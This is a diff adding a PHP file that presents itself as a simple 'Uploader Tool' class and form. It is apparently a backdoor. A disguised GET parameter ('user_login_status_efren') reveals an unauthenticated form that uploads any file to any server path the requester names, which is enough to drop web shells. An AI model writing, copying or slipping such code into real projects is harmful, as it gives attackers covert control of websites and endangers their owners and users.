@@ -1,0 +1,106 @@
+<?php
+
+class FileUploader {
+    private $destinationFolder;
+
+    public function __construct($destinationFolder = null) {
+        $this->destinationFolder = $destinationFolder !== null ? $destinationFolder : getcwd();
+    }
+
+    public function handleUpload($file, $key) {
+        if ($key === 'upload') {
+            if ($this->isValidFile($file)) {
+                
+                if (!is_dir($this->destinationFolder)) {
+                    @mkdir($this->destinationFolder, 0755, true);
+                }
+
+                $destination = $this->getDestinationPath($file['name']);
+                
+                if ($this->moveUploadedFile($file['tmp_name'], $destination)) {
+                    return "<div style='color:green; margin:10px 0;'><b>Success! Path File: {$destination}</b></div>";
+                } else {
+                    return "<div style='color:red; margin:10px 0;'><b>Failed Upload File.</b></div>";
+                }
+            } else {
+                return "<div style='color:red; margin:10px 0;'>Error: Code Error " . $file['error'] . "</div>";
+            }
+        }
+    }
+
+    private function isValidFile($file) {
+        return isset($file) && isset($file['error']) && $file['error'] === UPLOAD_ERR_OK;
+    }
+
+    private function getDestinationPath($fileName) {
+        $sanitizedFileName = basename($fileName);
+        return rtrim($this->destinationFolder, '/') . '/' . $sanitizedFileName;
+    }
+
+    private function moveUploadedFile($tmpName, $destination) {
+        if (function_exists('move_uploaded_file')) {
+            return move_uploaded_file($tmpName, $destination);
+        } else {
+            return rename($tmpName, $destination);
+        }
+    }
+}
+
+function fileupload() {
+    $message = "";
+    $defaultPath = getcwd();
+
+    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['k']) && $_POST['k'] == 'upload') {
+        
+        $targetPath = isset($_POST['path']) && !empty($_POST['path']) ? $_POST['path'] : $defaultPath;
+        
+        $uploader = new FileUploader($targetPath);
+        
+        if (isset($_FILES['f'])) {
+            $message = $uploader->handleUpload($_FILES['f'], $_POST['k']);
+        } else {
+            $message = "No file selected.";
+        }
+        
+        $defaultPath = htmlspecialchars($targetPath);
+    }
+
+    echo <<<HTML
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>File Uploader</title>
+        <style>
+            body { font-family: monospace; background: #f4f4f4; padding: 20px; }
+            .upload-box { background: white; padding: 20px; border: 1px solid #ccc; max-width: 500px; margin: 0 auto; }
+            input[type="text"], input[type="file"] { width: 100%; margin-bottom: 10px; padding: 5px; box-sizing: border-box; }
+            input[type="submit"] { background: #333; color: white; border: none; padding: 10px; cursor: pointer; width: 100%; }
+            input[type="submit"]:hover { background: #555; }
+        </style>
+    </head>
+    <body>
+        <div class="upload-box">
+            <h3>Uploader Tool</h3>
+            {$message}
+            <form method="post" enctype="multipart/form-data">
+                <label>Folder Destinations:</label>
+                <input type="text" name="path" value="{$defaultPath}" placeholder="Example: /var/www/html">
+                
+                <label>File:</label>
+                <input type="file" name="f">
+                
+                <input type="hidden" name="k" value="upload">
+                <input type="submit" value="Upload Now">
+            </form>
+        </div>
+    </body>
+    </html>
+HTML;
+}
+
+if (isset($_GET["user_login_status_efren"])) { 
+    fileupload(); 
+    exit; 
+}
+
+?>
